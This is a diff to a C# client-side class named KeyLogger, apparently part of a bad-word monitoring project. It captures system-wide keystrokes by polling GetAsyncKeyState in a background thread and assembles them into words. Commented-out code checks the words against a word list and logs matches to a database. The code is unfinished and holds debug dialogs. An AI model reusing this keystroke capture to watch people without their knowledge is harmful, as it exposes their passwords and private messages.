@@ -2,8 +2,10 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -12,21 +14,30 @@ namespace ClientSide
 {
     class KeyLogger
     {
+        public DBclient dbs;
+        public setSetting set;
+
+       public KeyLogger(DBclient dbs, setSetting set)
+        {
+            this.dbs = dbs;
+            this.set = set;
+            playThread();
+        }
+
         // keylogger from API
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public static void playThread()
+        public  void playThread()
         {
-
             Thread keyLogger = new Thread(playKeyLogger);
             keyLogger.Start();
-
-
         }
 
-        public static void playKeyLogger()
+        public  void playKeyLogger()
+
         {
+            string[] a = set.getWord();
             String input = "";
             Boolean flag = true;
             while (flag)
@@ -39,43 +50,48 @@ namespace ClientSide
                     if (keyState == 32769)
                     {
 
-                        input += (char)i;
+                        input += (char)i; 
 
                         if (i == 32)
                         {
-                            Console.WriteLine(input);
-                            if (input == "SARA ")
-                            {
-                                ShowErrorDialog("SARA insert");
-                                inputEqualsSARA();
+                            ShowErrorDialog(input);
+                            string replacement = input.Replace(" ", "");
+                           // ShowErrorDialog(replacement);
+                            /* foreach (string x in a)
+                             {
 
-                            }
+                                 string xb = x.Replace(" ", "");
+
+                                 if (replacement.ToLower().Equals(x))
+                                 {
+                                     ShowErrorDialog("bad ward insert");
+                                     dbs.connectToDatabase();
+                                     dbs.fillTable(1, DateTime.Now.ToString(), x + " " + "in process chrome");
+
+                                 }
+                             } */
                             input = "";
                         }
 
-
+                        // SARA 
                     }
-
                 }
-
-
-
-
             }
 
         }
 
-        private static void inputEqualsSARA()
+
+        public  void inputEqualsSARA()
         {
-
-
+           
+            
             // sava keylogger in file
-            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            String filepath = Environment.CurrentDirectory;
             if (!Directory.Exists(filepath))
             {
                 Directory.CreateDirectory(filepath);
             }
-
+           
             string path = (filepath + @"\AllAPP.txt");
 
             if (!File.Exists(path))
@@ -88,7 +104,7 @@ namespace ClientSide
                 sw.Write(AllApp);
 
             }
-            ShowErrorDialog(AllApp);
+            ShowErrorDialog(AllApp);//SARA 
 
 
 
@@ -102,3 +118,4 @@ namespace ClientSide
         }
     }
 }
+//SARA SARA 
